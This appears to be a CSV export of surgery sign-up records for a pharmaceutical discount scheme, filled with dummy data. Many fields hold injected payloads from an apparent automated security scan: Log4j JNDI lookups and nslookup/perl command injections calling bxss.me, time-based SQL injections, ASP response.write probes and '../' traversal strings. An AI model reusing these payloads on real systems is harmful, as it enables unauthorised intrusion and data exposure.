Unique ID,Surgery Name,Surgery Address 1,Surgery Address 2,Surgery Town,Surgery County,Surgery Post Code,Surgery Email,Surgery Telephone,TEVA Account No,TEVA Manager,Total Patients,Total Patients (Dispensing),Wholesaler Name,Wholesale Account,Wholesale Depot,Discount Axsain 45g,Discount Braltus Zonda 10mcg,Discount DuoResp Spiromax 160mcg/4.5mcg,Discount DuoResp Spiromax 320mcg/9mcg,Discount Qvar MDI 50mcg,Discount Qvar MDI 100mcg,Discount Qvar Easi-Breathe 50mcg,Discount Qvar Easi-Breathe 100mcg,Discount Zacin 45g,Authorised Signatory,Marketing Consent,Terms Agreement,Date Created,Activated,Date Activated,Sending bank details,
622e5540-4778-4ece-a711-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,../OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553f-b408-4380-9ef7-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553e-c17c-4be7-b21c-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553d-5410-49c9-bb76-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,`(nslookup hitygencbuswhc0253.bxss.me||perl -e &quot;gethostbyname(&#039;hitygencbuswhc0253.bxss.me&#039;)&quot;)`,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553e-8278-4b76-83c5-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553d-8e18-493b-9085-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553b-cf2c-453c-aad7-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553b-54ac-4195-b26d-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,../4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553a-beac-4ebb-8f2c-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,${j${::-n}di:dns${::-:}${::-/}/hitrwflagijtid3cfe${::-.}bxss.me}zzzz,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553a-2918-4da9-a0d1-10878d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e553a-fec8-4f81-9c72-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,|(nslookup hitqoymdonbrm1364f.bxss.me||perl -e &quot;gethostbyname(&#039;hitqoymdonbrm1364f.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5539-d734-44f0-a6ca-109a8d00a510,@@gBACR,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5539-4178-46ca-9ecb-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5538-2184-465f-9b42-10878d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5537-12d0-4016-982a-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1423911-6602.1423911.48d13${::-.}1${::-.}bxss.me}},NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5536-f14c-4c7d-9e4b-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,../555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5537-6ce8-4efd-8261-10e78d00a510,,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5535-e708-4495-9f76-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,${j${::-n}di:dns${::-:}${::-/}/hitocidvorjlmf0db3${::-.}bxss.me}zzzz,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5536-02fc-4c48-875f-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5536-b314-4c53-927f-10878d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,$(nslookup hitfejpbrdwnnadaf8.bxss.me||perl -e &quot;gethostbyname(&#039;hitfejpbrdwnnadaf8.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5535-af60-4d4b-91d8-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5535-338c-4511-9700-10e98d00a510,1&#039;&quot;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5533-e72c-4b61-8602-10e28d00a510,OdHqQRkU,3137 Laguna Street,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1423911-6601.1423911.48d13${::-.}1${::-.}bxss.me}},San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5533-f584-4f01-9c34-10878d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,(nslookup hitcxvmbyvfstcbdd5.bxss.me||perl -e &quot;gethostbyname(&#039;hitcxvmbyvfstcbdd5.bxss.me&#039;)&quot;),NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5533-58e8-4136-b75a-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5532-55f0-451d-8a68-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5532-5344-492d-bf8e-10e78d00a510,OdHqQRkU&#039;||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||&#039;,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5531-c20c-4d71-8810-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,|echo xcaizl$()\ myxbcl\nz^xyu||a #&#039; |echo xcaizl$()\ myxbcl\nz^xyu||a #|&quot; |echo xcaizl$()\ myxbcl\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5531-04f0-49aa-8f8a-10878d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5530-c85c-4203-90ca-10e28d00a510,7h6NhIEj&#039;)) OR 347=(SELECT 347 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5530-b210-4418-af4f-10e78d00a510,OdHqQRkU,3137 Laguna Street,${j${::-n}di:dns${::-:}${::-/}/hitxupuscckvk5fd7f${::-.}bxss.me}zzzz,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5530-d088-46bd-bc82-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552e-28e8-4239-8713-10e78d00a510,OdHqQRkU,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1423911-6600.1423911.48d13${::-.}1${::-.}bxss.me}},3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552f-5634-4080-a00a-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552f-4898-41cd-84e7-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,&amp;echo gejbwc$()\ vpdthk\nz^xyu||a #&#039; &amp;echo gejbwc$()\ vpdthk\nz^xyu||a #|&quot; &amp;echo gejbwc$()\ vpdthk\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552e-de18-49c1-9e91-10878d00a510,XCQjgBvH&#039;) OR 819=(SELECT 819 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552d-cfa0-4e6b-bc0d-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,echo kjkjss$()\ xfiiwv\nz^xyu||a #&#039; &amp;echo kjkjss$()\ xfiiwv\nz^xyu||a #|&quot; &amp;echo kjkjss$()\ xfiiwv\nz^xyu||a #,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552d-ae40-40cb-9e71-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552b-68e8-4770-9cd2-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552b-52e8-4dec-b622-10e98d00a510,OdHqQRkU,${j${::-n}di:dns${::-:}${::-/}/hitvmudnfsjqec607f${::-.}bxss.me}zzzz,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552c-be6c-46d3-8111-10878d00a510,NOdahsBG&#039; OR 741=(SELECT 741 FROM PG_SLEEP(15))--,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552a-1018-4c08-b930-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5529-9330-4e63-85e7-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,../94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5529-6a88-4821-93f0-10e78d00a510,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.002626.1423911-6599.1423911.48d13${::-.}1${::-.}bxss.me}},3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e552a-74fc-43f2-80b6-10878d00a510,TroVE1hq&#039;; waitfor delay &#039;0:0:15&#039; -- ,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5528-3738-428e-8053-10ad8d00a510,OdHqQRkU,3137 Laguna Street,`(nslookup hitrysrwrfkug77c66.bxss.me||perl -e &quot;gethostbyname(&#039;hitrysrwrfkug77c66.bxss.me&#039;)&quot;)`,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5528-ff14-4b55-bcad-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5527-e730-4882-b188-10e28d00a510,${j${::-n}di:dns${::-:}${::-/}/hitwstyrienct8adbb${::-.}bxss.me}zzzz,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5527-b110-4537-a84a-10878d00a510,1 waitfor delay &#039;0:0:15&#039; -- ,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5526-d898-4cc9-ab4c-10ad8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,No,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5527-ea84-47a4-8cd0-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5525-9178-47e6-bceb-10878d00a510,(select(0)from(select(sleep(15)))v)/*&#039;+(select(0)from(select(sleep(15)))v)+&#039;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5526-8a08-471d-82ef-10e98d00a510,OdHqQRkU,3137 Laguna Street,|(nslookup hitlspfxtbgjaa17b5.bxss.me||perl -e &quot;gethostbyname(&#039;hitlspfxtbgjaa17b5.bxss.me&#039;)&quot;),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5524-dd94-4820-9a2b-10e28d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,../NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5524-cbb0-4177-83cc-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5523-f8f0-4b35-b0e0-10878d00a510,0&quot;XOR(if(now()=sysdate(),sleep(15),0))XOR&quot;Z,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5524-1658-4c19-9fda-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,&quot;+response.write(9862059*9319927)+&quot;,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5522-f294-453c-922a-10828d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5522-bf98-48fd-818a-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5521-3850-4dd4-83f5-10878d00a510,OdHqQRkU,3137 Laguna Street,$(nslookup hitjjurdjxwob7511c.bxss.me||perl -e &quot;gethostbyname(&#039;hitjjurdjxwob7511c.bxss.me&#039;)&quot;),San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5522-12a0-487c-8ace-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,&#039;+response.write(9862059*9319927)+&#039;,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5520-f0d4-476e-ae1b-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5521-65d0-4761-8e27-10e28d00a510,0&#039;XOR(if(now()=sysdate(),sleep(15),0))XOR&#039;Z,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e551f-eb58-4f92-83ab-10e28d00a510,if(now()=sysdate(),sleep(15),0),3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5520-38e4-4949-bc89-10e98d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,response.write(9862059*9319927),Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e5520-b108-40d9-b2ec-10e78d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,../San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
622e551e-9c34-440c-b51f-109a8d00a510,OdHqQRkU,3137 Laguna Street,3137 Laguna Street,San Francisco,NY,94102,sample@email.tst,555-666-0606,4111111111111111,OdHqQRkU,1,1,DE Group,4111111111111111,1,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,Yes,2022-03-13,No,,Yes,
